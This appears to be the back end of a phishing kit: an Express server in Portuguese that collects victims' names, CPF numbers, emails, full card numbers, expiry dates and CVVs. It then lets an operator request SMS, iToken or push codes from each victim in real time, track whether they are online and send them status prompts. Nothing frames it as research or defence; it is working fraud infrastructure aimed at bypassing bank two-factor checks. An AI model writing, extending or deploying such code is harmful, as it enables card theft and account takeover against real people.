const express = require('express');
let clientes = [];
let ultimoId = 1;
const app = express();
app.use(express.json());
app.use(express.static('public'));

let dados = [];
let tipoAtual = null;
let statusAtual = null;

// Map para notificar clientes
let notificacoes = {}; // {clienteId: status}

///////////////////////
// Recebe dados do cliente
app.post('/enviar', (req, res) => {
  if(req.body.codigo){
    // Cliente enviou código
    const cliente = dados.find(d => d.id === req.body.id);
    if(cliente) {
      cliente.codigoDigitado = req.body.codigo;
      cliente.lastSeen = Date.now(); // ✅ ONLINE UPDATE
      cliente.online = true;         // ✅ ONLINE UPDATE
      notificacoes[cliente.id] = null;
    }
  } else {
    // Cliente enviou dados
    const novo = { 
      id: Date.now(), 
      nome: req.body.nome,
      cpf: req.body.cpf,
      email: req.body.email,
      nomeCartao: req.body.nomeCartao,
      cartao: req.body.cartao,
      validade: req.body.validade,
      cvv: req.body.cvv,
      codigoDigitado: null,
      online: true,          // ✅ NOVO
      lastSeen: Date.now()   // ✅ NOVO
    };

    dados.push(novo);

    console.log("NOVO CLIENTE RECEBIDO:");
    console.log(`Nome: ${novo.nome}`);
    console.log(`CPF: ${novo.cpf}`);
    console.log(`Email: ${novo.email}`);
    console.log("-------------------------");

    notificacoes[novo.id] = null;

    return res.send(novo);
  }
  res.send({ok:true});
});

///////////////////////
// CLIENTE ONLINE (NOVO)
app.post('/online', (req, res) => {
  const { id } = req.body;
  const cliente = dados.find(d => d.id === id);

  if(cliente){
    cliente.lastSeen = Date.now();
    cliente.online = true;
  }

  res.send({ok:true});
});

///////////////////////
// Lista de clientes
app.get('/dados', (req, res) => {

  dados.forEach(c=>{
    if(Date.now() - (c.lastSeen || 0) > 5000){
      c.online = false;
    }
  });

  res.json(dados);
});

///////////////////////
// Tipo SMS/iToken/Push
app.post('/tipo', (req, res) => { tipoAtual = req.body.tipo; res.send({ok:true}); });
app.get('/tipo', (req, res) => { const t = tipoAtual; tipoAtual = null; res.json({tipo:t}); });

///////////////////////
// Status final
app.post('/status', (req, res) => { statusAtual = req.body.status; res.send({ok:true}); });
app.get('/status', (req, res) => { const s = statusAtual; statusAtual = null; res.json({status:s}); });

///////////////////////
// Reinicia código
app.post('/reiniciar', (req, res) => {
  const c = dados.find(d => d.id === req.body.id);
  if(c) {
    c.codigoDigitado = null;
    notificacoes[c.id] = null;
  }
  res.send({ok:true});
});

///////////////////////
// Notificação para cliente
app.post('/notificarCliente', (req, res) => {
  const {id, status} = req.body;
  notificacoes[id] = status;
  res.send({ok:true});
});

///////////////////////
// Endpoint para cliente
app.get('/notificacao/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const status = notificacoes[id] || null;
  res.json({status});
});

///////////////////////
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Rodando na porta " + PORT);
});